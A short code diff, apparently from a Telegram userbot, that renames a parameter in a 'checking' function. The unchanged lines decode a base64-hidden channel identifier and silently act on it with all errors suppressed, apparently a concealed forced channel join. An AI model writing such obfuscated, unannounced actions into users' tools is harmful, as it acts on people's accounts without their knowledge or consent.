@@ -78,10 +78,10 @@ async def get_user_from_event(
     return None, None
 
 
-async def checking(jepiq):
+async def checking(dragoiq):
     cat_c = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
     try:
         cat_channel = Get(cat_c)
-        await jepiq(cat_channel)
+        await dragoiq(cat_channel)
     except BaseException:
         pass
